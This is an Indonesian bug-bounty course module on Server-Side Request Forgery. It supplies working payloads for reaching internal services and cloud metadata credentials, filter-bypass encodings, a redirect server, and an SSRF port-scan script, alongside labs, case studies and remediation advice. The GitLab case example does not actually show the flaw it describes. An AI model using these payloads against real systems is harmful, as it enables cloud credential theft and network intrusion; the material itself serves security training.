# Sesi 13 — SSRF: Server-Side Request Forgery

> **Level:** Intermediate–Advanced  
> **Durasi Estimasi:** 5–6 jam (teori + praktik)  
> **Prasyarat:** Sesi 02 (HTTP), Sesi 04 (Recon), Sesi 22 (API Security)  
> **Tools:** Burp Suite, Burp Collaborator / Interactsh, Postman

---

## 🎯 Tujuan Pembelajaran

Setelah menyelesaikan sesi ini, peserta mampu:
- Mengidentifikasi semua input vector yang berpotensi SSRF
- Melakukan basic dan blind SSRF exploitation
- Bypass filter SSRF (IP whitelist, DNS-based, redirect-based)
- Mengakses cloud metadata service via SSRF (AWS IMDSv1)
- Chain SSRF ke internal service access dan RCE
- Membuat laporan SSRF yang menjelaskan impact cloud exploitation

---

## 📚 Bagian 1 — Konsep SSRF

### 1.1 Apa Itu SSRF?

SSRF (Server-Side Request Forgery) terjadi ketika **server membuat HTTP request ke URL yang dikontrol attacker**. Server bertindak sebagai proxy yang memungkinkan attacker:

```
TANPA SSRF:
Attacker → [INTERNET] ──BLOCKED──► Internal Service (192.168.x.x)

DENGAN SSRF:
Attacker → Web Server → [Internal Network] → Internal Service
           (trusted)       (request dari
                           server = trusted!)
```

### 1.2 Mengapa SSRF Sangat Berbahaya di Era Cloud

```
Cloud Infrastructure (AWS/GCP/Azure):

Internet → EC2 Instance (Web App) → IMDSv1 (169.254.169.254)
                                      ↓
                               IAM Credentials
                               (AccessKeyId, SecretAccessKey, Token)
                                      ↓
                         FULL AWS ACCOUNT ACCESS!

SSRF di app yang running di EC2 → Metadata API → Cloud credentials → RCE/Data Breach
```

---

## 📚 Bagian 2 — Identifikasi SSRF Attack Surface

### 2.1 Input Vector yang Berpotensi SSRF

```
Feature yang menerima URL/alamat:

1. WEBHOOK / CALLBACK URL
   - "Notify me at this URL when event occurs"
   - API integrations, payment callbacks
   Example: POST /api/webhooks {"url": "https://ATTACKER_CONTROLLED"}

2. URL PREVIEW / LINK UNFURLING
   - Social media link preview
   - Slack/Discord-like URL preview
   Example: POST /api/preview {"url": "https://..."}

3. PDF GENERATOR / SCREENSHOT SERVICE
   - "Export as PDF" features
   - URL screenshot tools
   Example: POST /api/export/pdf {"url": "https://..."}

4. IMAGE FETCHER / AVATAR FROM URL
   - Import profile picture from URL
   - "Fetch image from URL" feature
   Example: POST /api/avatar {"image_url": "https://..."}

5. FILE IMPORT / RSS FEED
   - Import CSV/XML from URL
   - RSS feed reader
   Example: POST /api/import {"feed_url": "https://..."}

6. PROXY / REDIRECT SERVICE
   - Built-in URL redirector
   - Proxy endpoint
   Example: GET /proxy?url=https://...

7. INTERNAL ADMIN FEATURES
   - Health check endpoints
   - External API calls dengan URL dari config
   - Deployment hooks
```

### 2.2 Parameter Naming Patterns

```bash
# Grep dari JS atau intercept untuk parameter yang menerima URL
url=
imageUrl=
image_url=
link=
src=
href=
redirect=
redirectUrl=
return=
returnUrl=
callback=
callbackUrl=
webhook=
endpoint=
feed=
uri=
host=
destination=
target=
path=
```

---

## 📚 Bagian 3 — Basic SSRF Exploitation

### 3.1 SSRF ke Internal Network

```http
# Test 1: Loopback address
POST /api/fetch-url HTTP/1.1
Content-Type: application/json

{"url": "http://127.0.0.1/"}
{"url": "http://localhost/"}
{"url": "http://[::1]/"}    ← IPv6 loopback

# Test 2: Internal network ranges
{"url": "http://10.0.0.1/"}
{"url": "http://172.16.0.1/"}
{"url": "http://192.168.1.1/"}

# Test 3: Common internal services
{"url": "http://localhost:8080/"}      ← internal app
{"url": "http://localhost:8443/"}      ← internal HTTPS app
{"url": "http://localhost:9200/"}      ← Elasticsearch
{"url": "http://localhost:6379/"}      ← Redis
{"url": "http://localhost:5432/"}      ← PostgreSQL
{"url": "http://localhost:27017/"}     ← MongoDB
{"url": "http://localhost:4369/"}      ← Erlang/RabbitMQ
{"url": "http://localhost:2375/"}      ← Docker API
{"url": "http://localhost:2379/"}      ← etcd
```

### 3.2 Blind SSRF dengan Burp Collaborator / Interactsh

```bash
# Jika response tidak menampilkan konten dari URL yang difetch,
# gunakan out-of-band detection

# Setup Interactsh
interactsh-client
# Output: https://xxxxxxxxxxxx.interact.sh

# Kirim payload
POST /api/webhook HTTP/1.1
{"url": "https://xxxxxxxxxxxx.interact.sh/ssrf-test"}

# Cek Interactsh dashboard → apakah ada incoming request dari target server?
# Jika ada → SSRF CONFIRMED (blind)!
```

### 3.3 Internal Port Scanning via SSRF

```python
# Script Python untuk internal port scan via SSRF
import requests
import threading

target_api = "https://target.com/api/fetch"
internal_host = "127.0.0.1"
open_ports = []

def check_port(port):
    try:
        resp = requests.post(target_api, 
                            json={"url": f"http://{internal_host}:{port}/"},
                            timeout=10)
        if resp.status_code == 200:
            content_length = len(resp.text)
            # Port terbuka biasanya punya response lebih panjang
            if content_length > 10:
                open_ports.append(port)
                print(f"[OPEN] Port {port} - Response size: {content_length}")
    except:
        pass

# Scan port umum
common_ports = [21, 22, 23, 25, 80, 443, 8080, 8443, 3000, 
                3306, 5432, 6379, 8888, 9200, 27017]

threads = [threading.Thread(target=check_port, args=(p,)) for p in common_ports]
[t.start() for t in threads]
[t.join() for t in threads]

print(f"\nOpen ports: {open_ports}")
```

---

## 📚 Bagian 4 — Cloud Metadata Exploitation

### 4.1 AWS IMDS (Instance Metadata Service)

```
AWS Instance Metadata Service tersedia di 169.254.169.254
untuk setiap EC2 instance.

Jika aplikasi berjalan di EC2 dan rentan SSRF:
SSRF → http://169.254.169.254/ → Credentials IAM role → AWS API
```

**Exploit IMDSv1 (tidak ada authentication):**
```http
# Step 1: Konfirmasi akses ke metadata
POST /api/fetch HTTP/1.1
{"url": "http://169.254.169.254/latest/meta-data/"}

# Response yang berhasil:
# ami-id
# hostname
# iam/
# instance-id
# local-ipv4
# public-hostname
# ...

# Step 2: Dapatkan IAM role name
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
# Response: "MyAppRole"

# Step 3: Dapatkan credentials!
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/MyAppRole"}
# Response:
# {
#   "AccessKeyId": "ASIAXXXXXXXXXXX",
#   "SecretAccessKey": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
#   "Token": "IQoJb3JpZ2luX...",
#   "Expiration": "2024-06-01T12:00:00Z"
# }
```

**Informasi lain yang bisa didapat:**
```http
# User data script (sering mengandung secrets!)
{"url": "http://169.254.169.254/latest/user-data"}

# Instance identity document
{"url": "http://169.254.169.254/latest/dynamic/instance-identity/document"}

# Network interfaces
{"url": "http://169.254.169.254/latest/meta-data/network/interfaces/macs/"}
```

### 4.2 GCP & Azure Metadata

```http
# GCP (Google Cloud Platform)
# Header 'Metadata-Flavor: Google' diperlukan — cara inject via SSRF?
{"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"}

# Azure
{"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"}
# Azure membutuhkan header Metadata: true
```

### 4.3 IMDSv2 (AWS — Lebih Aman, tapi Bisa Dibypass)

```
IMDSv2 membutuhkan:
1. Request PUT untuk mendapatkan token
2. Gunakan token tersebut untuk request selanjutnya

Jika SSRF bisa kirim custom headers → bypass IMDSv2:

Step 1 (dapatkan token):
PUT http://169.254.169.254/latest/api/token
Header: X-aws-ec2-metadata-token-ttl-seconds: 21600

Step 2 (gunakan token):
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
Header: X-aws-ec2-metadata-token: [TOKEN_DARI_STEP_1]
```

---

## 📚 Bagian 5 — SSRF Filter Bypass

### 5.1 IP Address Encoding

```
Target: http://127.0.0.1/

Bypass dengan representasi alternatif:
- Decimal:        http://2130706433/
- Octal:          http://0177.0.0.1/ atau http://017700000001/
- Hex:            http://0x7f000001/ atau http://0x7f.0x0.0x0.0x1
- IPv6:           http://[::1]/ atau http://[::ffff:127.0.0.1]/
- Mixed encoding: http://0x7f.0.0.1/
- Domain:         Buat domain yang resolve ke 127.0.0.1

Target: http://169.254.169.254/ (AWS metadata)

Bypass:
- http://169.254.169.254.xip.io/ (wildcard DNS)
- http://[::ffff:a9fe:a9fe]/
- http://0251.0376.0251.0376/ (octal)
- http://0xa9.0xfe.0xa9.0xfe/ (hex)
```

### 5.2 DNS Rebinding

```
Konsep:
1. Attacker punya domain: ssrf.attacker.com
2. DNS record: ssrf.attacker.com → 1.2.3.4 (IP publik — untuk bypass whitelist)
3. TTL sangat pendek (1 detik)
4. Server fetch → DNS resolve ke 1.2.3.4 → whitelist check OK
5. Segera update DNS → ssrf.attacker.com → 127.0.0.1
6. Server fetch konten → DNS resolve ke 127.0.0.1 → akses internal!

Tools untuk DNS rebinding:
- Singularity of Origin (https://github.com/nccgroup/singularity)
- rbndr (https://github.com/taviso/rbndr)
```

### 5.3 Redirect-Based SSRF Bypass

```
Jika server memblokir URL internal secara langsung,
tapi mengikuti redirect:

1. Buat endpoint di server sendiri:
   https://attacker.com/redirect → 301 Redirect → http://169.254.169.254/

2. Kirim ke target:
   {"url": "https://attacker.com/redirect"}

3. Target fetch attacker.com → dapat redirect → follow ke internal!
```

**Setup redirect sederhana:**
```python
# server.py — redirect server
from flask import Flask, redirect
app = Flask(__name__)

@app.route('/r')
def ssrf_redirect():
    return redirect("http://169.254.169.254/latest/meta-data/iam/security-credentials/")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

### 5.4 Open Redirect + SSRF Chain

```http
# Target memblokir URL internal
# Tapi server punya open redirect!

# Open redirect ditemukan:
GET /redirect?url=https://evil.com → 302 Location: https://evil.com

# Chain:
POST /api/webhook
{"url": "https://target.com/redirect?url=http://169.254.169.254/latest/meta-data/"}

# Flow:
# App → fetch target.com/redirect → 302 → 169.254.169.254 → credentials!
```

---

## 📚 Bagian 6 — SSRF ke Internal Services

### 6.1 SSRF ke Elasticsearch

```http
# Elasticsearch tidak membutuhkan auth secara default
{"url": "http://localhost:9200/"}         ← cluster info
{"url": "http://localhost:9200/_cat/indices"}  ← list semua index
{"url": "http://localhost:9200/users/_search"} ← dump users!
```

### 6.2 SSRF ke Redis

```
Redis protocol via Gopher (jika server support):
gopher://127.0.0.1:6379/_SET ssrf_test "hacked"

Via HTTP (jika Redis dalam mode HTTP):
{"url": "http://localhost:6379/"}
```

### 6.3 SSRF ke Docker API

```http
# Docker API tersedia di port 2375 (unprotected) atau 2376 (TLS)
{"url": "http://localhost:2375/version"}       ← Docker version
{"url": "http://localhost:2375/containers/json"} ← list containers
{"url": "http://localhost:2375/images/json"}    ← list images

# Jika bisa akses Docker API → bisa create container → RCE!
```

---

## 🔴 Real Bug Bounty Cases

### Case 1 — SSRF ke AWS Metadata di Capital One (Real — 2019)

> **Incident:** Capital One Data Breach 2019  
> **Source:** DOJ Filing & Security Analysis  
> **Impact:** 100 juta+ customer records

**Detail (public information):**
Capital One menggunakan AWS WAF yang dikonfigurasi oleh pihak ketiga. Konfigurasi yang salah memungkinkan SSRF melalui endpoint yang bisa membuat request ke URL arbitrary. Attacker memanfaatkan SSRF untuk mengakses AWS IMDS dan mendapatkan IAM credentials dari instance role. Dengan credentials tersebut, data dari S3 buckets bisa di-exfiltrate.

**Pelajaran:**
- SSRF di cloud = potential critical breach
- IMDSv1 harus di-disable, gunakan IMDSv2
- IAM role permissions harus minimal (least privilege)

---

### Case 2 — SSRF di GitLab (CVE-2021-22214)

> **Source:** GitLab Security Advisory CVE-2021-22214  
> **Severity:** High (CVSS 8.6)

**Detail:**
GitLab CI Lint endpoint yang digunakan untuk validasi CI/CD YAML files memiliki SSRF vulnerability. Endpoint bisa membuat HTTP request ke URL internal yang dikontrol attacker melalui `trigger` field di YAML.

```yaml
# CI YAML yang exploit SSRF
stages:
  - test

test_job:
  trigger:
    project: "victim/project"
    strategy: depend

# Attacker bisa set URL internal di field yang seharusnya untuk project path
```

**Impact:** Akses ke internal GitLab services, metadata server, dan internal network scanning.

---

### Case 3 — SSRF di Shopify via PDF Generator (Real — Disclosed)

> **Platform:** HackerOne — Shopify  
> **Referensi:** [Shopify HackerOne Reports](https://hackerone.com/shopify)  
> **Severity:** High

**Skenario:**
Shopify memiliki fitur export ke PDF untuk receipts/invoices. Peneliti menemukan bahwa URL gambar yang dimasukkan ke dalam invoice template di-fetch oleh PDF generator di server side.

```http
# Invoice dengan image URL yang mengandung SSRF
POST /admin/invoices/create HTTP/1.1
{
  "invoice": {
    "items": [...],
    "logo_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  }
}

# PDF generator fetch URL tersebut → mengakses metadata AWS
# Konten metadata ter-include dalam PDF output!
```

---

### Case 4 — Blind SSRF via Webhook di Bug Bounty Platform (Pattern)

> **Tipe:** Blind SSRF via Webhook  
> **Inspirasi:** Pola umum dari webhook-based SSRF reports  
> **Severity:** High

```
Skenario:
1. Target memiliki fitur webhook: "Notify external service when X happens"
2. Peneliti input URL Interactsh sebagai webhook URL:
   https://xxxxxxxxxxxx.interact.sh/webhook-test
3. Trigger event yang memicu webhook
4. Interactsh menerima request dari IP server target → Blind SSRF confirmed

Eskalasi:
5. Ubah webhook URL ke internal:
   http://192.168.1.1/admin
   http://localhost:8080/api/admin
6. Jika ada response dalam payload webhook → Full SSRF!
```

---

## 🛠️ Lab Praktik

### Lab 1 — PortSwigger Web Academy SSRF Labs (Gratis)
- 🔗 [Basic SSRF against the local server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)
- 🔗 [Basic SSRF against another back-end system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)
- 🔗 [SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)
- 🔗 [SSRF with whitelist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)
- 🔗 [Blind SSRF with out-of-band detection](https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection)

### Lab 2 — TryHackMe
- 🔗 [SSRF Room](https://tryhackme.com/room/ssrfqi)
- 🔗 [Server-Side Request Forgery](https://tryhackme.com/room/ssrf)

### Lab 3 — HackTheBox Academy
- 🔗 [Server-Side Attacks Module (SSRF section)](https://academy.hackthebox.com/module/details/145)

### Lab 4 — SSRF Labs (Self-hosted)
```bash
# SSRFmap — SSRF exploitation framework + test environment
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap
pip3 install -r requirements.txt

# Jalankan vulnerable server untuk testing
python3 server.py
```

### Lab 5 — AWS SSRF Lab (Simulasi Cloud)
```bash
# CloudGoat — vulnerable AWS environment oleh Rhino Security
git clone https://github.com/RhinoSecurityLabs/cloudgoat
# Setup dan jalankan scenario ssrf_to_iam
```

---

## 📋 SSRF Testing Checklist

```markdown
## SSRF Checklist untuk [TARGET]

### Attack Surface Identification
- [ ] Webhook / callback URL input
- [ ] PDF/Screenshot generator
- [ ] Image fetcher / avatar from URL
- [ ] File import from URL (RSS, CSV, XML)
- [ ] Proxy / redirect endpoint
- [ ] Internal health check parameters

### Basic SSRF Test
- [ ] Interactsh/Collaborator untuk blind SSRF
- [ ] http://127.0.0.1/ → local access?
- [ ] http://localhost/ → local access?
- [ ] http://192.168.1.1/ → internal network?

### Cloud Metadata (jika app di cloud)
- [ ] http://169.254.169.254/ → AWS IMDS
- [ ] http://metadata.google.internal/ → GCP
- [ ] http://169.254.169.254/metadata → Azure

### Filter Bypass
- [ ] IP encoding (decimal, octal, hex, IPv6)
- [ ] DNS rebinding setup
- [ ] Open redirect chain
- [ ] URL scheme variation (file://, gopher://)

### Internal Services
- [ ] Port scan via SSRF (common ports)
- [ ] Elasticsearch (9200)
- [ ] Redis (6379)
- [ ] Docker API (2375)
- [ ] etcd (2379)
```

---

## 📖 Referensi & Bacaan Lanjutan

| Sumber | Link | Topik |
|--------|------|-------|
| PortSwigger | [SSRF Complete Guide](https://portswigger.net/web-security/ssrf) | Comprehensive SSRF |
| OWASP | [SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html) | Defense & bypass |
| Hacktricks | [SSRF Payloads](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery) | Payload collection |
| PayloadsAllTheThings | [SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery) | Bypass techniques |
| Orange Tsai | [A New Era of SSRF](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf) | Advanced SSRF research |
| AWS | [IMDSv2 Documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html) | Cloud defense |

---

## 🔑 Key Takeaways

1. **SSRF di cloud = potential critical** — satu request ke 169.254.169.254 bisa berujung penguasaan akun cloud
2. **Blind SSRF tetap valid** — bahkan tanpa response, out-of-band detection via Interactsh sudah cukup untuk laporan
3. **Filter bisa dibypass** — IP encoding, DNS rebinding, dan open redirect chain adalah teknik wajib dikuasai
4. **Attack surface SSRF terus bertambah** — webhook, PDF generator, dan URL preview ada di hampir semua app modern
5. **Impact harus jelas** — laporan SSRF yang baik harus tunjukkan apakah bisa akses cloud metadata atau internal services

---

## 📝 Template Laporan SSRF untuk Bug Bounty

```markdown
## [BUG] SSRF via [Feature Name] — AWS Metadata Accessible

**Severity:** Critical / High
**CVSS Score:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)

### Summary
Server-Side Request Forgery vulnerability in the [feature] endpoint allows 
an attacker to make the server perform HTTP requests to arbitrary internal 
resources, including the AWS Instance Metadata Service.

### Steps to Reproduce
1. Authenticate as any user
2. Navigate to [feature location]
3. Submit the following request:

```
POST /api/[endpoint] HTTP/1.1
Host: target.com
Authorization: Bearer [token]

{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```

4. Observe the response contains AWS IAM role credentials:
```
{"AccessKeyId": "ASIA...", "SecretAccessKey": "...", "Token": "..."}
```

### Impact
An attacker can:
1. Retrieve AWS IAM credentials for the instance role
2. Use those credentials to access all AWS services the role has access to
3. Potentially: read S3 buckets, call Lambda functions, access databases

### Remediation
1. Implement allowlist for permitted URL schemes and destinations
2. Block access to 169.254.169.254 at the network/security group level
3. Migrate from IMDSv1 to IMDSv2
4. Apply principle of least privilege to IAM instance roles
```
